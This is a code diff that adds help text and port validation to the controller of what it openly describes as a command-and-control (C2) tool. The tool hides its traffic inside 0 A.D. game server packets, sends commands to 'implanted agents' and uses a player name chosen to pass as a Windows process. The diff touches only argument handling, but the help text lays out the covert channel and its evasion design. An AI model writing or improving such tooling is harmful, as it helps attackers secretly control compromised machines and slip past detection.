@@ -759,8 +759,45 @@ done:
     free(line);}
 
 int main(int argc, char *argv[]){
-    if(argc<3){fprintf(stderr,"Usage: %s <host> <port> [name] [key]\n",argv[0]);return 1;}
-    const char *srv_host=argv[1];int srv_port=atoi(argv[2]);
+    /* ── Usage / help ─────────────────────────────────────────────────────────
+     * Check for -h / --help before the argument count check so the user can
+     * always get help even if they forget required arguments. */
+    if(argc>=2 && (strcmp(argv[1],"-h")==0 || strcmp(argv[1],"--help")==0)){
+        printf(
+            "Usage: %s <host> <port> [name] [key]\n"
+            "\n"
+            "Arguments:\n"
+            "  host   0 A.D. game server hostname or IP address\n"
+            "  port   Game server UDP port (default game port: 20595)\n"
+            "  name   Fake player name the controller uses in NMT packets\n"
+            "         (default: RuntimeBroker — looks like a Windows process)\n"
+            "  key    Pre-shared symmetric key for the C2 protocol\n"
+            "         (default: 0adC2DefaultKey — change for operations)\n"
+            "\n"
+            "Examples:\n"
+            "  %s 192.168.1.10 20595\n"
+            "  %s 10.0.0.1 20595 Spectator99 MySecretKey\n"
+            "\n"
+            "The controller connects to the game server as a spectator, then\n"
+            "listens for keep-alive beacons from implanted agents, performs\n"
+            "ECDH key exchange per agent, and provides a readline prompt for\n"
+            "sending commands and receiving output.\n",
+            argv[0], argv[0], argv[0]);
+        return 0;}
+
+    if(argc<3){
+        fprintf(stderr,"Usage: %s <host> <port> [name] [key]\n"
+                       "Try '%s --help' for full usage.\n",argv[0],argv[0]);
+        return 1;}
+
+    const char *srv_host=argv[1];
+    int srv_port=atoi(argv[2]);
+    /* Validate port: atoi() returns 0 on parse failure and on the literal "0".
+     * Both map to invalid port numbers (0 is reserved; >65535 is out of range). */
+    if(srv_port<=0||srv_port>65535){
+        fprintf(stderr,"[-] Invalid port: '%s' (must be 1-65535)\n",argv[2]);
+        return 1;}
+
     if(argc>3) strncpy(g_player,argv[3],sizeof(g_player)-1);
     if(argc>4) strncpy(g_key,argv[4],sizeof(g_key)-1);
 
